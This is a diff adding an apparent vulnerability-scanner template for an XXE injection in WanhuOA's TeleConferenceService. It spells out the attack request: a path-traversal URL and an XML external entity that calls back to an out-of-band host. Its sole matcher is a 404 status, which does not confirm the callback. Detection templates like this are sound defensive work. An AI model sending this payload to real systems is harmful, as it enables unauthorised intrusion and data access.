@@ -1,0 +1,26 @@
+id: wanhuoa-teleconferenceservice-xxe
+
+info:
+  name: WanhuOA TeleConferenceService XXE Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WanhuOA TeleConferenceService is vulnerable to an XML External Entity (XXE) injection that allows an attacker to include and execute external XML entities by sending a crafted XML payload.
+  tags: xxe, injection, wanhuoa
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8" ?>
+      <!DOCTYPE ANY [
+      <!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
+      <value>&xxe;</value>
+
+    matchers:
+      - type: status
+        status:
+          - 404
